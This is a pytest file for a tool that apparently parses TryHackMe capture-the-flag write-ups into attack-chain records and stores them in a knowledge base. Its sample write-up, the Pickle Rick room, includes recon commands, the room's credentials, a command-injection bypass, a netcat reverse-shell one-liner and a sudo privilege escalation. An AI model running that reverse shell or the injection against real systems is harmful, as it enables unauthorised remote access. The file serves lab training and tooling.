from __future__ import annotations

import tempfile
from pathlib import Path

from zeropath.db import KnowledgeBase
from zeropath.scrapers.thm_scraper import THMScraper, AttackStep, THMRoomProfile
from zeropath.scrapers.sync_kb import save_room_yaml, sync_room_to_kb, save_room_catalog

SAMPLE_WRITEUP = """
# TryHackMe - Pickle Rick Walkthrough
Difficulty: Easy
Category: Web

Today we are solving the Pickle Rick room on TryHackMe.
This Rick and Morty themed CTF requires us to exploit a web server to find three ingredients.

## 1. Reconnaissance
Let's start by scanning the target IP with nmap:
`nmap -sC -sV -oN nmap_scan.txt 10.10.10.10`
Ports 22 (SSH) and 80 (HTTP) are open.

Next, we run gobuster to enumerate directories:
`gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt`
We find `login.php` and `robots.txt`. Looking at the HTML source, we find a username note: R1ckRul3s.
In robots.txt, we find the password `Wubbalubbadubdub`.

## 2. Initial Access
Logging into login.php takes us to a Command Panel.
We test command injection: running `ls -la` works!
However, `cat` is blocked. We can read `Sup3rS3cretPickl3Ingred.txt` using `less` or `tac`.
We obtain ingredient 1.
Next, we get a reverse shell using python or netcat:
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.1 4444 >/tmp/f`

## 3. Privilege Escalation
Once we have our reverse shell as www-data, we run `sudo -l`.
We see:
`(ALL) NOPASSWD: ALL`
We can simply execute `sudo su` or `sudo bash` to become root!
As root, we navigate to `/root` and read the final ingredient flag.
"""


def test_parse_writeup_text():
    scraper = THMScraper()
    profile = scraper.parse_writeup_text(SAMPLE_WRITEUP, source_url="https://medium.com/test-picklerick", room_hint="Pickle Rick")

    assert profile.code == "pickle_rick" or "pickle" in profile.code
    assert profile.difficulty == "Easy"
    assert profile.category == "Web"
    assert "nmap" in profile.tools
    assert "gobuster" in profile.tools
    assert len(profile.attack_chain) >= 3

    # Recon phase
    assert profile.attack_chain[0].phase == "recon"
    # Initial access
    assert profile.attack_chain[1].phase == "initial_access"
    assert profile.attack_chain[1].technique in ["Remote_Command_Injection", "Web_Vulnerability_Exploitation"]
    # Privesc phase
    assert profile.attack_chain[2].phase == "privilege_escalation"
    assert "Sudo" in profile.attack_chain[2].technique


def test_save_and_sync_kb(tmp_path):
    scraper = THMScraper()
    profile = scraper.parse_writeup_text(SAMPLE_WRITEUP, source_url="https://medium.com/test-picklerick", room_hint="Pickle Rick")
    profile.code = "picklerick"

    # 1. Test saving YAML
    yaml_file = save_room_yaml(profile, base_dir=tmp_path)
    assert yaml_file.exists()
    content = yaml_file.read_text(encoding="utf-8")
    assert "picklerick" in content
    assert "difficulty: Easy" in content

    # 2. Test saving catalog
    cat_file = save_room_catalog([profile], base_dir=tmp_path)
    assert cat_file.exists()
    cat_text = cat_file.read_text(encoding="utf-8")
    assert "picklerick" in cat_text

    # 3. Test syncing into KnowledgeBase
    db_file = tmp_path / "test_kb.db"
    kb = KnowledgeBase(
        config=type("Cfg", (), {"sqlite_url": f"sqlite:///{db_file}", "vector_dim": 4})()
    )
    kb.init()

    sync_room_to_kb(profile, kb)

    # Verify SQLite row
    room = kb.sql.get_room("picklerick")
    assert room is not None
    assert room.difficulty == "Easy"

    # Verify techniques
    techs = kb.sql.list_room_techniques("picklerick")
    assert len(techs) >= 3

    # Verify attack path graph edge
    t1 = techs[0][0]
    t2 = techs[1][0]
    path = kb.graph.shortest_path(t1, t2)
    assert path is not None
    assert path.nodes == [t1, t2]
